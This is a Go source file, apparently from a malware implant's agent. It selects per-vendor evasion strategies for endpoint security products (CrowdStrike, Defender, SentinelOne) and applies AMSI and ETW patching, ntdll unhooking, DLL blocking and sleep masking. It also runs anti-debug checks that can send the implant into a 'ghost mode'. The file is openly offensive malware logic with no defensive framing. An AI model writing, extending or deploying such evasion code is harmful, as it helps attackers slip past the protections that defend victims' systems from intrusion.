//go:build windows

package main

import (
	"fmt"
	"runtime"
)

var defaultStrategies = map[string]EvasionStrategy{
	EDRCrowdStrike: {
		Name:            EDRCrowdStrike,
		IndirectSyscall: true,
		StackSpoofing:   true,
		PEBBlockDLLs:    false,
		AMSIPatch:       true,
		ETWPatch:        true,
		VEHUnhook:       false,
		SleepMask:       true,
	},
	EDRDefender: {
		Name:            EDRDefender,
		IndirectSyscall: true,
		StackSpoofing:   false,
		PEBBlockDLLs:    true,
		AMSIPatch:       true,
		ETWPatch:        false,
		VEHUnhook:       true,
		SleepMask:       true,
	},
	EDRSentinelOne: {
		Name:            EDRSentinelOne,
		IndirectSyscall: true,
		StackSpoofing:   true,
		PEBBlockDLLs:    false,
		AMSIPatch:       false,
		ETWPatch:        true,
		VEHUnhook:       true,
		SleepMask:       true,
	},
	EDRUnknown: {
		Name:            EDRUnknown,
		IndirectSyscall: true,
		StackSpoofing:   false,
		PEBBlockDLLs:    true,
		AMSIPatch:       true,
		ETWPatch:        true,
		VEHUnhook:       true,
		SleepMask:       true,
	},
}

func (e *EDRInfo) GetStrategy() EvasionStrategy {
	if !e.Detected {
		return EvasionStrategy{
			Name: "none",
		}
	}
	if s, ok := defaultStrategies[e.Name]; ok {
		return s
	}
	return defaultStrategies[EDRUnknown]
}

func ApplyStrategy(s EvasionStrategy) {
	useIndirectSyscall = s.IndirectSyscall
	useStackSpoofing = s.StackSpoofing
	pebBlockDLLs = s.PEBBlockDLLs
	patchAMSI = s.AMSIPatch
	patchETW = s.ETWPatch
	enableSleepMask = s.SleepMask

	if Debug {
		fmt.Printf("[EDR] Strategy: %s\n", s.Name)
		fmt.Printf("[EDR]   IndirectSyscall=%v StackSpoofing=%v PEBBlockDLLs=%v\n",
			s.IndirectSyscall, s.StackSpoofing, s.PEBBlockDLLs)
		fmt.Printf("[EDR]   AMSIPatch=%v ETWPatch=%v VEHUnhook=%v SleepMask=%v\n",
			s.AMSIPatch, s.ETWPatch, s.VEHUnhook, s.SleepMask)
	}

	if runtime.GOOS != "windows" {
		return
	}

	if s.AMSIPatch {
		amsiBypass()
	}
	if s.ETWPatch {
		etwBypass()
	}
	if s.PEBBlockDLLs {
		blockDLLs()
	}
	if s.VEHUnhook {
		unhookNtdll()
	}
}

// ── Adaptive Evasion Flags ───────────────────────────────────────────────
// Set by ApplyStrategy() from the detected-EDR strategy. All consumers are
// in windows-tagged files (agent_windows, evasion_*, antidebug_windows), so
// the declarations live here instead of the cross-platform types file.
var (
	useIndirectSyscall bool
	useStackSpoofing   bool
	pebBlockDLLs       bool
	patchAMSI          bool
	patchETW           bool
	enableSleepMask    bool
)

// applyAdaptiveEvasion detects the active EDR, applies its evasion strategy
// and runs the early anti-debug sweep. Extracted from main(): the flag writes
// and AntiDebugCheck plumbing below only exist in windows builds, where this
// whole path is meaningful (the !windows build stubs it as a plain EDR scan).
func applyAdaptiveEvasion() {
	edrInfo := DetectEDR()
	strategy := edrInfo.GetStrategy()
	ApplyStrategy(strategy)
	if edrInfo.Detected && Debug {
		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
	}

	score, details := AntiDebugCheck()
	if score > 20 {
		logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
		if score > 50 {
			enterGhostMode("anti-debug threshold exceeded")
		} else {
			patchAMSI = false
			patchETW = false
		}
	}
	go runAntiDebugMonitor()
}
